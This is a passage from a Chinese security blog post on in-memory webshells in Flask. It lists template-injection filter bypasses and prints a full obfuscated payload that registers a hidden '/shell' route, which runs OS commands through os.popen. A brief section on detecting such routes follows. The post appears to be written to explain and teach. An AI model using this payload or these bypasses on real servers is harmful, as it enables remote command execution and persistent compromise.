+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>在实际操作的过程中，经常会发现某些函数或者符号被过滤了，这个时候就需要一些绕过的技巧,这有助于我们进一步的开展攻击</p>
+<ul>
+<li><code>url_for</code> 可用 <code>get_flashed_messages</code> 或 <code>request.application.__self__._get_data_for_json</code> 等替换；</li>
+<li>代码执行函数替换，如 exec 等替换 eval；</li>
+<li>字符串可采用拼接方式，如 <code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code> 变为 <code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>；</li>
+<li><code>__globals__</code> 可用 <code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code> 替换；</li>
+<li><code>[]</code>中括号可用 <code>.__getitem__()</code> 或 <code>.pop()</code> 替换；</li>
+<li>过滤<code>&#123;&#123;`或者`&#125;&#125;</code>，可以使用<code>&#123;%`绕过，`&#123;%%&#125;</code>中间可以执行if语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果</li>
+<li>过滤<code>_</code>，可以用编码绕过， 比如：<code>__class__ =&gt; \x5f\x5fclass\x5f\x5f</code></li>
+<li>过滤了<code>_</code>，还可以用<code>dir(0)[0][0]</code>或者<code>request[&#39;args&#39;]</code>或者 <code>request[&#39;values&#39;]</code>绕过</li>
+<li>过滤了<code>.</code> 我们可以采用<code>attr()</code>或<code>[]</code>绕过</li>
+<li>……</li>
+</ul>
+<p>payload example:</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.application.<span class="variable">__self__</span>.<span class="variable">_get_data_for_json</span>.<span class="variable">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).<span class="variable">__getitem__</span>(<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>).<span class="variable">__getitem__</span>(<span class="string">&#x27;ex&#x27;</span>+<span class="string">&#x27;ec&#x27;</span>)(<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;calc&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ct&#x27;</span>+<span class="string">&#x27;x_stack&#x27;</span>:get_flashed_messages.<span class="variable">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).pop(<span class="string">&#x27;_request_&#x27;</span>+<span class="string">&#x27;ctx_stack&#x27;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages.<span class="variable">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).pop(<span class="string">&#x27;curre&#x27;</span>+<span class="string">&#x27;nt_app&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure>
+
+
+<p>flask 还有一个有趣的特性就是</p>
+<p><strong>Flask在渲染模板的时候，有</strong></p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__</span>===<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>
+<p>这一特性，把上下文变成了[]中的字符串，这个特性经常会被用来绕过点号的过滤。<br>由于里面的内容已经是字符串了，还可以做一个这样的变形</p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__</span>===<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>python的格式化字符串特性</strong></p>
+<p>因为python的字符串格式化允许指定ascii码为字符<br>如果放到flask里，就可以改写成<br><code>&quot;&#123;0:c&#125;&quot;[&#39;format&#39;](97)</code></p>
+<img src="http://img.npfs06.top/20210930003251.png" style="zoom:80%;">
+
+<p>那么<code>__class__</code>就可以变成</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;</span>[&#x27;&#123;0:c&#125;&#x27;[&#x27;format&#x27;](<span class="name">95</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">95</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">99</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">108</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">97</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">115</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">115</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">95</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">95</span>)]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>数字被过滤</strong></p>
+<p>当我们使用attr的时候，需要用的数字，那么如果数字被过滤了，我们可以使用这些特殊的数字来绕过</p>
+<img src="http://img.npfs06.top/20210930083133.png" style="zoom:80%;">
+
+
+
+
+
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><ul>
+<li>查看所有内建模块中是否包含 eval、exec 等可以执行代码的函数如：class <code>warnings.catch_warnings</code>、class <code>site.Quitter</code>等。</li>
+<li>检测 <code>self.add_url_rule()</code> 中特殊名字的路由如 shell 等。</li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.kitsch.live/2021/05/17/webshell%E2%91%A3python%E5%92%8Cphp%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.kitsch.live/2021/05/17/webshell%E2%91%A3python%E5%92%8Cphp%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/09/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/">https://www.geekby.site/2021/09/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/274466.html">https://www.freebuf.com/articles/web/274466.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/iceyhexman/flask_memory_shell">https://github.com/iceyhexman/flask_memory_shell</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>安小琪
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://npfs06.top/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/" title="浅析php&amp;python内存马">https://npfs06.top/2021/09/30/浅析php-python内存马/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/09/29/%E4%B8%BB%E6%9C%BA%E5%AD%98h%E6%B4%BB%E6%8E%A2%E6%B5%8B%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99/" rel="prev" title="主机存活探测程序编写">
+      <i class="fa fa-chevron-left"></i> 主机存活探测程序编写
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/10/10/Ciphey-%E8%A7%A3%E5%AF%86%E7%A5%9E%E5%99%A8/" rel="next" title="Ciphey--解密神器">
+      Ciphey--解密神器 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell"><span class="nav-number">1.</span> <span class="nav-text">webshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell%E5%86%85%E5%AD%98%E9%A9%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">webshell内存马使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">3.</span> <span class="nav-text">PHP 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="nav-number">3.1.</span> <span class="nav-text">检测方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">4.</span> <span class="nav-text">Python 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#flask-context"><span class="nav-number">4.1.</span> <span class="nav-text">flask context</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0webshell"><span class="nav-number">4.2.</span> <span class="nav-text">构造webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#builtins-%E5%87%BD%E6%95%B0%E7%A7%91%E6%99%AE"><span class="nav-number">4.2.1.</span> <span class="nav-text">__builtins__ 函数科普</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Demo"><span class="nav-number">4.3.</span> <span class="nav-text">Demo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-%E8%A7%A3%E6%9E%90"><span class="nav-number">4.3.1.</span> <span class="nav-text">payload 解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">4.4.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B"><span class="nav-number">4.5.</span> <span class="nav-text">检测</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安小琪"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">安小琪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+
+
+<!--
+ <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+-->
+
+
+  <span class="author" itemprop="copyrightHolder">安小琪</span>
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
+  </div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
+      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
+      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
+      avatar     : '',
+      meta       : guest,
+      pageSize   : '6' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
